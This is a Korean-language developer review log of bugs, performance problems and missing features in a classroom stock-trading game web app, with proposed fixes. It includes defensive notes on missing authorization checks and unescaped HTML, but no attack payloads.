- **`get_history()` 차트 가격 생성 방향 역방향 버그** (`stock_service.py:287-310`): `price = float(current)`로 현재가에서 출발해 `for i in range(n_bars, 0, -1)`로 과거 날짜 순서대로 봉을 생성하므로, bars[0](가장 오래된 날짜)의 `open`이 현재가와 동일하고 bars[-1](가장 최근 날짜)은 무작위 가격이 됨. 학생이 차트를 보면 "30일 전 삼성전자가 현재와 같은 가격이었다"는 잘못된 인상을 받음. 수정 방법: `price = STOCKS[symbol]['base'] * random.uniform(0.85, 1.15)`로 과거 임의 시작가를 설정한 뒤 현재가 방향으로 수렴하도록 전진 생성하거나, 단순히 배열을 역순으로 생성해 bars[-1].close가 `current`에 가깝도록 수정 (`stock_service.py:288` 초기화 변경).

- **퀴즈 FAB 버튼에 쿨다운 표시 없음** (`app.py:1209-1213`, `index.html:465`): 학생이 퀴즈를 풀면 60초 쿨다운이 시작(`app.py:1286`)되는데 FAB 버튼("🧠 퀴즈")에 남은 대기시간이 표시되지 않음. 반복 클릭 시 오버레이가 열렸다 닫히며 `get_quiz()` API를 계속 호출. `openQuiz()` 내에서 `data.cooldown > 0`이면 오버레이를 열지 않고 FAB 텍스트를 "🧠 퀴즈 (N초)"로 변경하는 로컬 카운트다운을 실행하면 불필요한 API 호출과 혼란을 동시에 방지 가능 (서버 변경 불필요, `app.js` 퀴즈 관련 함수에 10줄 추가).

- **`force_price()` 이후 `_next_biases` 미갱신으로 효과 소멸** (`stock_service.py:218-242`): 교사가 개별 종목 강제 조정 시 `self._current_biases`만 갱신되지 않고, `_next_biases`에도 반영이 없음. `_maybe_generate_news()`가 다음 뉴스 사이클에서 `self._current_biases = self._next_biases.copy()`를 실행하면 강제 조정 방향이 덮어씌어져 무작위 방향으로 가격이 재진행됨. `stock_service.py:240` 이후에 `self._next_biases[symbol] = direction` 한 줄을 추가하면 강제 조정의 모멘텀이 다음 뉴스 사이클까지 유지됨. `force_sector_event()`에도 동일하게 `for sym in affected: self._next_biases[sym] = direction` 추가 권장 (`stock_service.py:260`).

- **게임 종료 후 학생별 최종 보유 종목 확인 불가** (`app.py:132-142`, `models.py:44-51`): `_end_room()`에서 `RoomHolding` 레코드를 현금으로 전환 후 전부 삭제(`db.session.delete(h)`, `app.py:140`)하여, 결과 화면이나 엑셀에서 "마지막에 어떤 종목을 보유했나"를 재현할 수 없음. `RoomMember`에 `final_portfolio = db.Column(db.Text, nullable=True)` JSON 컬럼을 추가하고 `delete(h)` 직전에 `{symbol: {shares, avg_price, final_price, gain_pct}}` 딕셔너리를 JSON 직렬화해 저장하면, 결과 화면 "내 거래 내역" 섹션과 엑셀 두 번째 시트에서 종목별 투자 전략 분석이 가능해짐 (`models.py:49` 이후 컬럼 추가, `app.py:134` 루프 내 수집 로직 추가).

- **학생이 브라우저 주소창에서 직접 방 번호를 입력하면 방 정보 노출** (`app.py:397-435`): `GET /api/rooms/<rid>` 엔드포인트가 `@login_required`만 있고 해당 방의 멤버인지 확인하지 않음. 로그인만 되면 방 코드를 모르는 타 교사의 방 이름·남은 시간·멤버 수·룰렛 설정 여부 등이 응답에 포함됨 (`room_dict()`, `app.py:252-270`). `RoomMember.query.filter_by(room_id=rid, user_id=uid).first()` 또는 `room.host_id == uid` 체크를 추가하거나, 미인가 사용자에게는 `code`·`status`·`remaining_seconds`만 포함한 최소 응답을 반환하도록 제한 권장.

---

### 제거/단순화할 것들

- **`room_dict()` 내 `member_count` COUNT 쿼리 캐시 미스 시마다 실행** (`app.py:263`): `'member_count': RoomMember.query.filter_by(room_id=room.id).count()`가 `room_dict()` 내부에서 매번 실행됨. 로비 폴링(5초)과 `get_room()` 폴링(10초)이 맞물리면 초당 여러 건의 COUNT 쿼리가 발생. 단기적으로는 `Room` 모델에 `member_count = db.Column(db.Integer, default=0)` 컬럼을 추가해 `join_room()`·`kick_member()` 시 동기 갱신(`room.member_count += 1`)하거나, `host/lobby-members` 응답 길이를 프론트엔드에서 캐싱해 `room_dict` 호출 횟수 자체를 줄이는 방식으로 개선 가능 (`app.py:263` 한 줄).

- **`RoomHolding`·`Deposit`·`RoomTransaction` 테이블 복합 인덱스 누락** (`models.py:54-62`, `models.py:65-76`, `models.py:79-88`): 세 테이블 모두 `room_id + user_id` 기준 조회가 압도적으로 많지만 인덱스가 없음(`RoomHolding`은 `UniqueConstraint`가 있어 인덱스 자동 생성되지만, `RoomTransaction`과 `Deposit`은 없음). 학생 30명이 30분 게임을 하면 `RoomTransaction`에 수백 건이 쌓이는데, `member_total_value()` 호출 시 전체 테이블 스캔 발생. `models.py:76` 이후에 `__table_args__ = (db.Index('idx_txn_room_user', 'room_id', 'user_id'),)` 추가, `models.py:88` 이후에 `__table_args__ = (db.Index('idx_dep_room_user', 'room_id', 'user_id'),)` 추가로 즉시 해결 가능.

- **`get_quiz()` 쿨다운 체크와 상태 갱신이 원자적이지 않음** (`app.py:1200-1214`): `remaining = state.get('cooldown_until', 0) - time.time()` 체크 후 `_quiz_state[key] = {'qid': ..., 'cooldown_until': 0}` 저장 사이에 쓰레드 전환이 발생하면 두 요청이 동시에 쿨다운 없이 문제를 받을 수 있음. `threading.Lock()` (방별로 `_quiz_locks: dict = {}` 관리)으로 check-then-set을 원자화하거나, 최소한 `_quiz_state[key]`에 갱신 전 임시 마커를 먼저 저장해 중복 진입을 방지하면 공정성 확보. `submit_quiz()`의 쿨다운 설정(`app.py:1286`)도 동일한 락 내에서 처리 필요.

- **`create_room()` 방 이름 길이 검증 하한선만 있고 상한선 없음** (`app.py:333-334`): `if not name or len(name) < 2` 체크만 있어 100자 이상의 방 이름도 허용됨. `Room.name` 컬럼이 `db.String(100)`(`models.py:27`)이므로 실제로는 100자가 최대이지만, 검증 에러 없이 DB 레벨에서 잘릴 수 있음. `if len(name) > 50: return jsonify({'error': '방 이름은 50자 이하'})` 추가 + 프론트엔드 `room-name` 입력에 `maxlength="50"` 속성 추가(`index.html:63`)로 UI·서버 검증 일치 가능.

- **`_lot_round_due()` 에서 `pct >= 2/3` 조건이 게임 마지막 1/3 전체에 걸쳐 복권 트리거 가능** (`app.py:161-170`): `pct >= 2/3 and 2 not in done` 조건은 게임의 67~100% 구간 전체에서 `round=2` 복권을 트리거 가능하게 함. `_auto_start_lottery_if_due()` 가 `get_room()` 폴링마다 호출되므로, 진행자가 룰렛 직전에 `round=2` 복권을 건너뛰면 다음 폴링(10초 후)에서 즉시 재트리거될 수 있음. `lottery_skip()`이 `done` set에 round를 추가하므로 재트리거는 안 되지만, `_lot_round_due()` 로직이 `1/3 ~ 2/3` 구간에서 `round=1`, `2/3 ~ 1` 구간에서 `round=2`만을 정확히 담당한다는 주석이 없어 유지보수자가 의도를 파악하기 어려움. 조건 앞에 `# 1/3 경과 시 1회, 2/3 경과 시 2회` 주석 한 줄 추가 + 반환값 타입 힌트 `-> Optional[int]` 추가 권장 (`app.py:161`).

- **`_end_room()`에서 `db.session.commit()` 이후 인메모리 상태 정리 순서** (`app.py:141-152`): `db.session.commit()` 이후에 `cleanup_room_service()`, `_lots.pop()`, `_rlt_active.pop()` 등이 실행됨. commit 성공 후 예외가 발생해 인메모리 정리가 중단되면 (예: `_quiz_state` 정리 중 `KeyError`), 다음 `get_room()` 호출에서 이미 종료된 방에 대해 잘못된 상태가 반환될 수 있음. `try/finally` 블록으로 인메모리 정리를 보장하거나, `db.session.commit()` 전에 인메모리 상태를 로컬 변수에 미리 수집해 commit 성공 후 일괄 정리하는 방식으로 원자성 향상 가능 (`app.py:141-152` 블록 재구조화).

---

## 2026-06-19 (2차)

### 추가하면 좋을 기능

- **게임 60분 경계에서 복권 스케줄 불일치** (`app.py:168`): 최근 커밋(`d279ce2`)으로 추가된 `if total_s > 3600` 조건에서, 정확히 60분(=3600초) 게임은 2회 스케줄(1/3·2/3 주기)을 사용하고, 60분 1초(3601초) 이상 게임은 4회 스케줄(1/5·2/5·3/5·4/5 주기)을 사용함. 교사가 게임 시간을 "60분"으로 설정하면 직관적으로 4회 스케줄이 적용될 것으로 기대할 수 있어 혼란 유발. `>` 를 `>=` 로 바꾸거나, UI 상 "60분 이상이면 복권 4회" 안내 문구를 방 생성 화면(`index.html:63` 부근 게임 설정 섹션)에 추가하면 해결.

- **복권 번호 선택 화면에 "랜덤 선택" 버튼 없음** (`app.js:2106-2154`): 학생이 1~45 중 6개를 하나씩 클릭해야 해 제한 시간(60초) 내에 번호 선택을 완료하지 못하는 경우 발생. 기존 "제출하기" 버튼 옆에 "랜덤 선택" 버튼을 추가하고, 클릭 시 `Array.from({length:45},(_,i)=>i+1).sort(()=>Math.random()-.5).slice(0,6).sort((a,b)=>a-b)` 로 자동 선택·그리드 표시·counts 갱신하면 10초 이상 걸리는 번호 선택을 1클릭으로 단축 가능. 서버 변경 불필요, `app.js` 25줄 이내 구현.

- **참여자 게임 화면에 방 설정 정보 미표시** (`app.js:587-597`, `index.html` screen-p-game): 학생 게임 화면 상단 바에 타이머(`pg-timer`)만 있고 시작 자금·예금 금리가 전혀 보이지 않음. "예금 금리가 몇 %예요?" 질문이 수업 중 반복됨. 타이머 아래 `<div style="font-size:10px;color:var(--muted)">시작 자금 ${krw(S.room.starting_cash)} · 금리 ${S.room.deposit_rate}%</div>`를 `enterParticipantGame()` 내 `app.js:596`에서 동적으로 주입하면 한 줄로 해결.

- **폴링 실패 시 연결 상태 알림 없음** (`app.js:608-648`): 참여자 poll interval(10초) 내 `api.get()` 응답이 에러 객체이거나 `fetch` 자체가 예외를 던져도 조용히 넘어가 학생이 연결이 끊겼는지 모름. 실패 횟수를 카운트해 3회 연속 실패 시 `toast('⚠️ 서버 연결이 불안정합니다. 새로고침을 시도하세요.', 'error')` 를 표시하고, 다음 성공 응답에서 카운트를 초기화하면 학교 인트라넷 환경에서 학생이 자발적으로 수동 새로고침할 수 있는 시각적 단서 제공. `app.js:610` 이전에 `let _pollFailCount = 0` 선언, poll 콜백에 `try/catch` 래퍼 추가로 구현 가능.

- **결과 화면에서 미니게임(룰렛·복권) 수익 분리 표시 없음** (`app.py:784-793`, `app.js:1724-1741`): `total_value`에 투자 수익과 룰렛·복권 당첨금이 합산되어 "진짜 투자 실력"과 "운"이 구분되지 않음. `get_rankings()` 응답에 `minigame_profit` 필드를 추가(`RoomTransaction.query.filter_by(room_id=rid, user_id=m.user_id, action='RLT')` + `note='복권'` 포함 ADJ 합산)하고, 결과 화면 "내 결과" 카드에 "투자 손익: X원 / 미니게임 손익: Y원" 두 줄을 표시하면 교육적 반성 포인트가 명확해짐 (`app.py:788`에 필드 추가, `app.js:1727`에 렌더링 추가).

- **진행자 게임 이벤트 로그 없음** (`app.py:647-670`, `app.py:1299-1314`): `force_price()`, `market_event()`, 뉴스 수동 트리거 이벤트가 서버에 기록되지 않아 진행자가 "아까 삼성전자를 몇 % 올렸지?" 확인 불가. `_event_log: dict = {}` (방별 리스트)를 선언하고 각 진행자 조작 함수에서 `_event_log.setdefault(rid, []).append({'ts': datetime.now(KST).strftime('%H:%M:%S'), 'action': label})`를 삽입. `GET /api/rooms/<rid>/host/event-log` 엔드포인트로 노출하고 진행자 대시보드 하단에 최근 이벤트 10개 피드를 표시하면 수업 중 이벤트 추적 가능. `_end_room()`에서 해당 로그도 정리.

- **복권 결과 화면에서 참여자별 번호 나열이 학번/이름 없이 uid 문자열로 표시** (`app.js:2190-2197`, `app.py:1103-1107`): `get_lottery()` → `all_results` 딕셔너리의 키가 `str(user.id)` (숫자 문자열)이며, 진행자 결과 모달 테이블의 "번호" 열에 uid가 아닌 학생 이름을 표시하지 않음. 서버 `app.py:1103`에서 `all_results`를 빌드할 때 `{uid_str: {'matched':…, 'prize':…, 'picks':…, 'username': u.username}}` 형태로 `username`을 포함하고, `app.js:2191`의 테이블 렌더링에서 `uid` 대신 `r.username`을 첫 열에 표시하면 진행자가 누가 당첨됐는지 즉시 파악 가능.

---

### 제거/단순화할 것들

- **`get_room()` 룰렛 자동 트리거 시 N+1 쿼리** (`app.py:421-426`): 게임 잔여 5초 이하 룰렛 트리거 체크에서 `non_host` 멤버 전체를 가져온 뒤 각 멤버별로 `RoomTransaction.query.filter_by(room_id=rid, user_id=m.user_id, action='RLT').count()`를 개별 호출함. 30명 게임이라면 30회 COUNT 쿼리가 게임 마지막 10초 구간의 모든 `get_room()` 폴링마다 반복 발생. `db.session.query(db.func.count()).filter(RoomTransaction.room_id==rid, RoomTransaction.action=='RLT').scalar()` 한 번으로 총 RLT 건수를 조회 후 `< len(non_host) * 3` 비교하거나, `any(...)` 생성식 대신 서브쿼리로 단일 쿼리로 대체하면 N → 1 건으로 단순화 가능 (`app.py:423-426`).

- **`minigame_close()` 내 deprecated `Room.query.get(rid)` 사용** (`app.py:945`): `_rlt_lock` 블록 내부에서 `room = Room.query.get(rid)`를 호출함. 이전 항목들에서 `.query.get_or_404()` 교체를 권장했으나, 이 함수의 `.query.get()` (Not Found 시 None 반환 패턴)은 별도로 남아 있음. SQLAlchemy 2.0에서 동일하게 폐기 예정이므로 `db.session.get(Room, rid)` 로 교체 필요. 반환값이 None일 때 `if not room: return jsonify({'ok': True})` 가드도 함께 추가하면 안전 (`app.py:945`).

- **`loadParticipantRankings()` 에러 객체를 "참여자 없음"으로 오인** (`app.js:1642-1643`): `api.get()` 실패 시 `{error: 'HTTP 500'}` 객체가 반환되는데, 다음 줄의 `if (!data.length)` 체크에서 `undefined`(falsy)로 평가되어 "참여자 없음" 빈 화면을 보여줌. 서버 오류와 실제 빈 방이 동일하게 렌더링됨. `if (data.error || !Array.isArray(data)) return;` 가드를 `app.js:1642` 직전에 추가하고, 네트워크 오류일 경우 이전 렌더링을 유지하거나 토스트를 표시하면 혼란 방지.

- **`openStockModal()` 포트폴리오 탭 fallback에서 `change_pct`에 매수 수익률 혼입** (`app.js:1522-1524`): 포트폴리오 탭 보유 종목의 "매수/매도" 버튼 클릭 시 `openStockModal('${h.symbol}', {…, change_pct: ${h.gain_pct}})` 형태로 호출. `h.gain_pct`는 평균 매수가 대비 평가손익률이지만, 모달 `ms-change` 요소에 "▲ +3.45%"처럼 오늘의 가격 변동률인 것처럼 표시됨. `S.stocks.find(s => s.symbol === h.symbol)` 로 현재 시장 데이터를 우선 조회하거나, `openStockModal()` 첫 줄에서 `S.stocks.find()`로 최신 데이터를 덮어쓰는 로직을 추가하면 올바른 일중 변동률 표시 가능 (`app.js:1292-1294`에 overwrite 로직 추가).

- **`startConfetti()` requestAnimationFrame 루프 화면 이탈 후에도 계속 실행** (`app.js:1761-1800`): `requestAnimationFrame(draw)` 재귀 호출로 동작하는 색종이 애니메이션이 `goHome()`·`showScreen()` 호출로 결과 화면을 벗어나도 계속 실행됨. `alpha <= 0` 이 될 때까지 불필요한 GPU·CPU를 소모. `let _confettiRaf = null` 변수에 RAF ID를 저장하고 (`_confettiRaf = requestAnimationFrame(draw)` 로 변경), `showLanding()` 함수(`app.js:92-97`) 내에서 `if (_confettiRaf) { cancelAnimationFrame(_confettiRaf); _confettiRaf = null; }` 를 추가하면 화면 이탈 즉시 루프 중단 가능.

- **`_do_reveal()` 당첨자별 멤버 개별 DB 조회** (`app.py:191-193`): 복권 결과 적용 시 `cur.get('picks', {}).items()` 루프 내에서 매 반복마다 `RoomMember.query.filter_by(room_id=rid, user_id=uid).first()`를 호출. 30명 게임이라면 30건의 SELECT가 발생. 함수 진입부에서 `member_map = {m.user_id: m for m in RoomMember.query.filter_by(room_id=rid).all()}`로 일괄 로드 후 `member_map.get(uid)`로 O(1) 조회하면 30 → 1건으로 단순화 (`app.py:178` 함수 시작 직후 한 줄 추가, `app.py:191` 조회 제거). 이미 `_auto_start_lottery_if_due()`에서 `member_count = RoomMember.query.filter_by().count()`를 호출하므로 해당 결과를 `cur` 딕셔너리에 미리 저장하는 것도 고려.

- **`force_price()` 뉴스 생성 시 `time.time()` 이중 호출** (`stock_service.py:237-240`): `self._news = {'timestamp': time.time(), ...}` 와 `self._last_news_ts = time.time()` 이 두 개의 별도 `time.time()` 호출로 이루어져 있음. 두 값이 미세하게 달라지면 `_maybe_generate_news()` 내 `now - self._last_news_ts >= self._news_ttl` 와 `data.timestamp > S.newsTs` (프론트) 비교가 서로 다른 기준을 사용하게 됨. `now = time.time()`을 한 번 호출해 두 곳에 동일 값을 할당하면 논리적 일관성 보장 (`stock_service.py:235` 에 `now = time.time()` 추가, 237·240번 줄에서 `now` 참조).

---

## 2026-06-20

### 추가하면 좋을 기능

- **룰렛 모달 강제 종료 없을 시 게임 영구 정지 위험** (`app.py:907-932`, `app.py:934-963`): 참가자가 룰렛 모달(`minigame/open`)을 연 뒤 브라우저를 강제 종료하거나 네트워크가 끊기면 `_rlt_active[rid]['count']`가 감소하지 않아 게임이 영구 일시정지 상태에 빠짐. `_rlt_active[rid]`에 `opened_at: time.time()` 타임스탬프를 기록하고, `get_room()` 처리 중 `count > 0`이 10분 이상 지속될 경우 강제 `unfreeze` 및 카운터 초기화를 삽입하거나, 진행자 대시보드에 "룰렛 강제 종료" 버튼을 추가하면 수업 중 먹통 사태를 예방 가능.

- **`change_pct`가 게임 시작가 기준 누적 수익률로 표시됨** (`stock_service.py:121-128`, `stock_service.py:278-279`): `_prev` 딕셔너리가 `_init_prices()`에서 게임 시작 시 1회만 설정되어 이후 갱신되지 않음. 30분 후반부에 표시되는 `▲ +35%`는 게임 시작 이후 누적 상승률이므로, 학생들이 "방금 급등한 것"으로 오해함. `get_price()` 내 가격 갱신 코드(`stock_service.py:185`) 직전에 `self._prev[symbol] = price`를 추가하면 각 주기별 실제 틱 등락률을 보여줄 수 있음.

- **종료된 게임에 재접속 시 결과 화면 복원 불가** (`app.py:278-284`, `app.js:73-79`): `find_active_room()`이 `status.in_(['waiting','active','paused'])`만 검색하므로, 결과가 발표된 방을 브라우저를 닫은 뒤 재접속해도 결과를 볼 방법이 없음. `find_active_room()` 쿼리에 `status='ended'` + `results_published=True` 조건을 추가하거나, `GET /api/auth/me` 응답에 `last_ended_room` 필드를 포함시켜 결과 화면으로 자동 복원하면 수업 후 토론·복습에 활용 가능.

- **진행자 대시보드에 학급 전체 통계 없음** (`app.py:511-531`, `app.js:406-429`): 진행자 순위 화면은 개별 랭킹만 보여주고 "평균 수익률", "수익자 비율", "최대 손실 학생"과 같은 학급 단위 집계 정보가 없음. `host_members` 응답에 `avg_gain_pct`, `positive_count`, `negative_count`를 추가하고 순위 목록 위에 요약 카드를 표시하면, 교사가 "지금 반에서 몇 명이 수익 중이에요?"라는 즉흥적 질문을 수업에 활용 가능.

- **용어사전 검색이 키 입력마다 API 호출 (디바운스 없음)** (`app.js:1891-1894`): `oninput` 이벤트에 연결된 `searchGlossary()`가 키 입력마다 `GET /api/education/glossary?q=...`를 전송하며 한글 IME 조합 단계에서도 반복 호출됨. `loadGlossary()` 시 `S.glossaryData`에 이미 전체 데이터가 캐싱되어 있으므로(`app.js:1869-1871`), API 재호출 없이 `renderGlossary(S.glossaryData.filter(...))` 클라이언트 필터링으로 전환하면 서버 부하를 완전히 제거 가능.

- **퀴즈가 `paused` 상태에서도 제출 가능** (`app.py:1225-1230`, `app.py:1229`): `submit_quiz()`는 `room.status != 'active'`를 체크해 종료 후 제출을 막지만 `'paused'` 상태는 허용함. 복권 진행 중 게임이 자동 일시정지된 상태에서 퀴즈 오버레이가 열려 있는 학생이 제출하면 패널티가 적용됨. `app.py:1229`의 조건을 `room.status not in ('active', 'paused')` 대신 명시적으로 `room.status == 'active'`만 허용하도록 수정하거나, 일시정지 상태에서는 퀴즈 FAB 버튼 자체를 비활성화(`updateTradeButtonState()` 확장)하는 것이 안전.

---

### 제거/단순화할 것들

- **`export_rankings()` N+1 쿼리** (`app.py:1384-1392`): `member_total_value(rid, m.user_id)`를 참가자 수만큼 루프에서 반복 호출하며 각 호출마다 `RoomHolding`·`Deposit` 추가 쿼리 실행. `get_rankings()` 및 `host_members()`의 N+1 패턴(06-11 지적)과 동일한 문제가 엑셀 내보내기에도 존재. 루프 진입 전 `holdings = {h.user_id: [] for ...}` 일괄 로드 후 딕셔너리 그룹화로 교체하면 쿼리 수 O(N)→O(1)으로 단순화 가능.

- **진행자 룰렛 설정 테이블 색상과 실제 룰렛 색상 불일치** (`index.html:222-249`, `app.js:904`): 진행자 룰렛 설정 UI 테이블의 색상 마커(`#c0392b`, `#e67e22`, `#f1c40f`, `#27ae60`, `#3498db`)와 실제 학생 룰렛 휠·범례의 `_RLT_COLORS` 배열(`#e74c3c`, `#3498db`, `#f39c12`, `#2ecc71`, `#9b59b6`)이 서로 다름. 진행자가 "빨간 칸이 꽝"이라고 안내해도 학생 화면에서는 색상 배치가 달라 혼선 발생. `index.html` 설정 테이블의 인라인 컬러를 `_RLT_COLORS`와 동일하게 맞추거나, CSS 변수로 통일하면 해결.

- **`_lots[rid]['done']` Python `set` 타입 → JSON 직렬화 불가** (`app.py:156`, `app.py:200`): 복권 완료 회차를 추적하는 `_lots[rid]['done']`이 `set` 객체로 저장됨. 지금은 인메모리라 문제없지만, 향후 Redis 저장이나 로그 직렬화 시 `json.dumps()` 실패. `set` → `list` 저장 후 `if round_n not in done_list:` 선형 탐색 또는 별도 `set()` 변환으로 조회하는 방식으로 교체하면 구조가 명확해지고 직렬화 안정성 확보.

- **`refreshMyRank()`와 `loadParticipantRankings()` 같은 폴링 주기에서 중복 API 호출** (`app.js:733-751`, `app.js:645-648`): 참가자 게임 폴링(`app.js:611`)에서 `refreshMyRank()`는 매 10초마다 `GET /rankings`를 호출하고, 순위 탭이 활성화된 경우에는 `loadParticipantRankings()`도 동일 API를 중복 호출함. 같은 폴링 사이클에서 rankings API가 2회 연속 실행. `refreshMyRank()` 응답 데이터를 `S.lastRankings`에 저장해두고, 순위 탭 활성 시에는 재요청 없이 그 캐시로 목록을 렌더링하면 요청 1건 절약.

- **`_set_sqlite_pragmas()`가 PostgreSQL 환경에서도 실행됨** (`app.py:18-29`): `db.engine` 전역 `"connect"` 이벤트로 등록된 `_set_sqlite_pragmas()`가 `DATABASE_URL` 환경변수로 PostgreSQL을 사용할 때도 실행됨. psycopg2는 `PRAGMA` 명령을 `ProgrammingError`로 처리할 수 있어 Render에서 PostgreSQL로 전환 시 연결 자체가 실패할 위험. `app.py:29` 이벤트 등록 직전에 `if 'sqlite' in str(db.engine.url):` 조건 가드를 추가하면 SQLite 전용 최적화를 안전하게 분리 가능.

---

## 2026-06-20 (2차)

### 추가하면 좋을 기능

- **`get_history()` `interval` 파라미터 완전 무시 → 모든 차트 탭에서 일봉만 표시** (`stock_service.py:281`, `stock_service.py:292-306`): `get_history(symbol, period, interval)` 함수가 `interval` 파라미터를 받지만 본체에서 전혀 사용하지 않음. `app.py:684`의 `pm` 딕셔너리는 `'1d'→interval='5m'`, `'1w'→interval='30m'`, `'1y'→interval='1wk'` 등 의미 있는 값을 전달하지만, 내부 `n_bars` 딕셔너리와 `now - i * 86400`(1일 고정 간격)은 이를 완전히 무시. "오늘(1일)" 탭에 오늘의 5분봉 대신 지난 30일치 일봉이 표시되고 "1년" 탭도 30개 일봉에 불과해 차트 탭이 실질적으로 전혀 다르게 보이지 않음. 수정 방법: `step_secs = {'5m':300,'30m':1800,'1d':86400,'1wk':604800}.get(interval,86400)` 변수를 추가하고 `now - i * step_secs` 로 봉 간격 결정, 인트라데이(`step_secs < 86400`)인 경우 `date_str`을 `'%H:%M'` 포맷으로 교체하면 기간별 올바른 차트 표시 가능 (`stock_service.py:296` 한 줄 수정).

- **`host_adjust()` `delta=0` 허용으로 더미 `RoomTransaction` 생성** (`app.py:564-569`): `delta = float(d.get('delta', 0))` 이후 delta 값 검증 없이 바로 `db.session.add(RoomTransaction(... amount=delta ...))` 실행. 교사가 금액을 입력하지 않고 "조정" 버튼을 누르면 `amount=0` 거래 기록이 학생 내역에 영구 기록됨. 클라이언트 `doAdjust()`(`app.js:489`)의 `isNaN(delta)` 체크는 `delta=0`을 통과시킴. `app.py:565` 직후에 `if delta == 0: return jsonify({'error': '조정 금액을 입력하세요'}), 400`, `app.js:493`에도 `if (delta === 0) { err.textContent = '금액을 입력하세요.'; return; }` 추가 권장.

- **`lobby_members` 인가 없음 → 로그인만 되면 모든 방의 멤버 목록 열람 가능** (`app.py:546-554`): `@login_required`만 있고 해당 방의 호스트·멤버 여부 확인이 없음. 로그인한 학생이 `GET /api/rooms/1/host/lobby-members`부터 순차 호출하면 서비스 전체 참가자 이름·user_id를 수집 가능. 2026-06-12에 URL 명칭 혼란은 지적했으나 실제 권한 누락 자체는 미지적. `user = cur_user(); if room.host_id != user.id and not RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(): return jsonify({'error': '권한 없음'}), 403` 체크 추가로 해결.

- **`gen_code()` 10회 실패 시 중복 코드 반환 → `IntegrityError` → 500 오류** (`models.py:8-13`): 10회 시도 후에도 고유 코드를 찾지 못하면 마지막 생성값을 그대로 반환. `Room.code = db.Column(db.String(6), unique=True)`이므로 충돌 시 `create_room()` 커밋이 `IntegrityError` → 500 HTML → 프론트 `api.post()` JSON 파싱 실패(`SyntaxError`) → 조용히 오류 발생. `create_room()`에서 `db.session.commit()` 주위에 `try/except IntegrityError: db.session.rollback(); return jsonify({'error': '방 생성 실패. 재시도하세요.'}), 500` 래퍼 추가, 또는 `gen_code()`를 `for _ in range(20)`으로 재시도 횟수 늘리고 최종 반환 전에도 충돌 체크하도록 강화 가능.

- **`startTimer()` 클라이언트 시계 오차 → 학생마다 다른 카운트다운 표시** (`app.js:767`): `rem = Math.floor((new Date(S.room.end_time) - new Date()) / 1000)` — `new Date()`는 브라우저/OS 로컬 시계를 사용. 학생 기기 시계가 3분 빠르거나 느리면 카운트다운이 앞서거나 뒤처져 "종료 1분 전" 예금 만기 경고와 마지막 거래 기회가 불공평하게 분배됨. 개선 방법: 폴링 응답 `S.room.remaining_seconds`를 기준으로 `let _localRem = S.room.remaining_seconds; let _pollAt = Date.now();`를 저장하고, 매 tick마다 `Math.max(0, _localRem - Math.floor((Date.now() - _pollAt) / 1000))`으로 계산하면 매 폴링마다 서버 기준으로 보정되는 정확한 타이머 구현 가능 (`app.js:757-773` 대상).

- **`trade()` 응답에 업데이트된 보유 수량 미포함 → `S.tradeHolding` 로컬 오차 누적** (`app.py:732-736`, `app.js:1313-1321`): `trade()` 응답 `{message, cash}`에 `shares` 값이 없어 프론트엔드가 `S.tradeHolding += shares`로 로컬 계산에 의존. 퀴즈 오답 자동 청산·룰렛 베팅 강제 매도 등 서버 측 자동 처리가 병행될 경우 `S.tradeHolding`이 실제 DB 보유량과 누적 오차를 가져 모달 "현재 보유" 수량이 틀리게 표시됨. `app.py:731` holding 처리 후 `new_shares = holding.shares if holding else 0`을 저장해 응답에 `'shares': new_shares` 추가, `app.js:1316`에서 `S.tradeHolding = data.shares`로 서버 정확값 직접 사용하면 오차 근본 제거.

---

### 제거/단순화할 것들

- **`get_history()` 이중 락 사이 가격 변경 시 캐시 불일치** (`stock_service.py:285-309`): 첫 `with self._lock:`에서 `current = self._prices[symbol]`을 읽고 락 해제 후, 봉 데이터를 생성하고 두 번째 `with self._lock:`에서 캐시에 저장. 두 락 사이에 `force_price()` 등으로 가격이 바뀌면 구 가격 기반 차트가 `HISTORY_CACHE_TTL=120`초 동안 캐시에 남음. 전체 봉 생성 로직을 첫 번째 락 블록 내로 이동(연산이 짧아 블로킹 허용)하거나, 두 번째 락 진입 시 `if self._prices[symbol][1] != current: pass`(캐시 저장 생략)로 일관성 보장 가능 (`stock_service.py:285-309` 구조 재정리).

- **`loadLobbyMembers()` · `loadPLobbyMembers()` 내 `m.username` XSS 미처리** (`app.js:227`, `app.js:581`): 두 함수 모두 `${m.username}`을 innerHTML에 직접 삽입. `app.js:815`에 `escHtml()` 유틸이 이미 정의돼 있으므로 `escHtml(m.username)`으로 교체하면 즉시 방어. `loadLobbyMembers()`의 `onclick="doKickMember(${m.user_id},'${m.username.replace(/'/g,"\\'")}')"`는 따옴표만 처리해 `"` 또는 `)`가 포함된 이름에서 속성이 깨질 수 있음 — `data-uid`·`data-name` 속성과 이벤트 위임 패턴으로 교체 권장.

- **`loadStudentTxn()` `t.note` HTML 미처리 → XSS 가능** (`app.js:524`): `${t.note ? ' · ' + t.note : ''}` 가 innerHTML에 직접 삽입. `t.note`는 `host_adjust()`에서 교사가 자유 입력하는 텍스트(`d.get('note', '진행자 자산 조정')`)이므로 HTML 입력 시 학생 화면에서 렌더링됨. 2026-06-18 (2차)에서 username XSS를 지적했으나 note 필드는 누락. `escHtml(t.note)`로 교체하거나 `createTextNode`로 분리 삽입하면 즉시 방어 가능. `app.js` 내 innerHTML에 서버 데이터를 삽입하는 모든 지점의 일괄 감사 권장.

- **`doEndGame()` `confirm` 없이 즉시 API 호출 → 오터치 시 즉시 종료 위험** (`app.js:538`): `doStartGame()`은 `if (!confirm('게임을 시작하시겠습니까?')) return;` 가드(`app.js:247`)가 있지만 `doEndGame()`에는 없음. 잔여 시간 < 60초이거나 이미 `_ending_soon` 상태에서 한 번 더 탭하면 즉시 `_end_room()` 실행. 모바일에서 오터치로 게임이 바로 종료되는 시나리오가 실제 수업에서 발생 가능. `doEndGame()` 첫 줄에 `if (!confirm('정말 게임을 종료하시겠습니까?')) return;` 한 줄 추가, 또는 종료 버튼 클릭 후 2초 내 재확인을 요구하는 두 번 클릭 방지 패턴 고려.

